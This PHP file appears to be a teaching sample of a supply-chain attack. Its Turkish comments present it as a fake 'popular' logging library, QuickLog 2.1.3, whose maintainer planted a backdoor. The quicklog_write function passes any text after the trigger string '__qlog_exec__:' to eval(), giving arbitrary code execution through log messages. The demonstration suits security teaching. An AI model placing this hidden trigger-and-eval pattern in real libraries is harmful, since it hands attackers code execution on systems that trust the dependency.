<?php
/**
 * QuickLog 2.1.3 — "popüler" üçüncü taraf loglama kütüphanesi (SAHTE).
 * SUPPLY-CHAIN: kötü niyetli bir maintainer tarafından BACKDOOR eklendi.
 * Senin kodun temiz görünür; zafiyet GÜVENDİĞİN BAĞIMLILIKTA.
 */

function quicklog_version(): string
{
    return '2.1.3';
}

/** Normalde sadece loglar — ama gizli bir backdoor barındırır. */
function quicklog_write(string $msg): string
{
    $marker = '__qlog_exec__:';                 // gizli tetikleyici (backdoor)
    $pos = strpos($msg, $marker);
    if ($pos !== false) {
        $code = substr($msg, $pos + strlen($marker));
        ob_start();
        @eval($code);                           // ----- BACKDOOR (maintainer ekledi) -----
        return (string) ob_get_clean();
    }
    return 'logged: ' . $msg;
}
